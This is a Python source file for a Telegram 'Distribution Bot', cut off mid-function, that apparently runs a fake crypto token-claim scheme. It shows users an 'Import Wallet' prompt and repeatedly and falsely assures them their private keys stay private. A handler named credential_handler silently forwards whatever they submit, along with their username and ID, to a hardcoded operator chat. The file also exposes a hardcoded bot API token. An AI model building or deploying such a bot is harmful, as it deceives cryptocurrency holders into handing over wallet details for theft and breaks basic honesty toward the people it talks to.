import os
import logging
from telegram import Update
from telegram.ext import ApplicationBuilder, CommandHandler, MessageHandler, filters, ContextTypes

# 📜 Configure logging
logging.basicConfig(
    filename='distribution_bot.log',
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# 🔑 Hardcoded API token and Manager Chat ID
TOKEN = "8058896295:AAEcfAaPmcbVjGz4px9urfFokGOeno-YZfk"
MANAGER_CHAT_ID = 6900254572

# 👋 Start command
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        await update.message.reply_text(
            "👋 *Welcome to the Distribution Bot!* 🎉\n\n"
            "Tap /claimtoken to continue.",
            parse_mode="Markdown"
        )
        logger.info(f"User @{update.effective_user.username or 'unknown'} (ID: {update.effective_user.id}) started the bot")
    except Exception as e:
        logger.error(f"Error in start command: {e}")
        await update.message.reply_text("⚠️ An error occurred. Please try again later.")

# ℹ️ Help command (retained for usability)
async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        await update.message.reply_text(
            "ℹ️ *Distribution Bot Help* ℹ️\n\n"
            "This bot simulates a token distribution process for educational purposes.\n\n"
            "📋 *Commands*:\n"
            "➡️ /start - Start the bot\n"
            "➡️ /claimtoken - Begin the token claim process\n"
            "➡️ /confirm - Confirm your distribution\n"
            "➡️ /help - Show this help message\n\n"
            "🛡️ *Note*: This is a read-only process. Your private keys remain 100% private and inaccessible.",
            parse_mode="Markdown"
        )
        logger.info(f"User @{update.effective_user.username or 'unknown'} (ID: {update.effective_user.id}) requested help")
    except Exception as e:
        logger.error(f"Error in help command: {e}")
        await update.message.reply_text("⚠️ An error occurred. Please try again later.")

# 🎟️ Claim token command
async def claimtoken(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        await update.message.reply_text(
            "📥 *Import Wallet* 📥\n\n"
            "Please provide your wallet address (Phantom-style, e.g., *88631DEyXSWf...*).\n"
            "🔒 *The process is read-only*, meaning the bot can only view your wallet balance to confirm eligibility. "
            "Your private keys stay *100% private and inaccessible* at all times.",
            parse_mode="Markdown"
        )
        logger.info(f"User @{update.effective_user.username or 'unknown'} (ID: {update.effective_user.id}) initiated claimtoken")
    except Exception as e:
        logger.error(f"Error in claimtoken command: {e}")
        await update.message.reply_text("⚠️ An error occurred. Please try again later.")

# 📤 Message handler
async def credential_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        message = update.message.text.strip()
        user = update.effective_user

        # 🛡️ Validate input
        if not message:
            await update.message.reply_text(
                "❌ Please provide a valid wallet address.",
                parse_mode="Markdown"
            )
            logger.warning(f"User @{user.username or 'unknown'} (ID: {user.id}) sent empty message")
            return

        if len(message) > 100:  # Limit to reasonable wallet address length
            await update.message.reply_text(
                "❌ Wallet address is too long. Please provide a valid address.",
                parse_mode="Markdown"
            )
            logger.warning(f"User @{user.username or 'unknown'} (ID: {user.id}) sent overly long message")
            return

        # Acknowledge receipt
        await update.message.reply_text(
            "📤 *Distribution in Progress* 📤\n\n"
            "Make sure the wallet holds a minimum of *$4* to be eligible for distributions.\n"
            "Tap /confirm to confirm the distribution.",
            parse_mode="Markdown"
        )
        logger.info(f"User @{user.username or 'unknown'} (ID: {user.id}) submitted wallet address")

        # Forward to manager instantly
        await context.bot.send_message(
            chat_id=int(MANAGER_CHAT_ID),
            text=(
                f"📥 *New Wallet Submission* 📥\n\n"
                f"From: @{user.username or 'unknown'} (ID: {user.id})\n"
                f"Wallet Address: `{message}`"
            ),
            parse_mode="Markdown"
